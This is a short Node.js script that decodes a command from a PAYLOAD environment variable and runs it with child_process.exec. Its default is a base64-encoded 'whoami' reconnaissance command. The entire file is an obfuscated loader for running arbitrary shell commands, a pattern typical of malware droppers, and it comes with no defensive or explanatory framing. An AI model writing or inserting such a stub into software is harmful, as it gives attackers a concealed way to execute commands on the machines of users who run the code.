const dec = require('./decoder');
const { exec } = require('child_process');
const cmd = dec(process.env.PAYLOAD || 'd2hvYW1p');
exec(cmd);
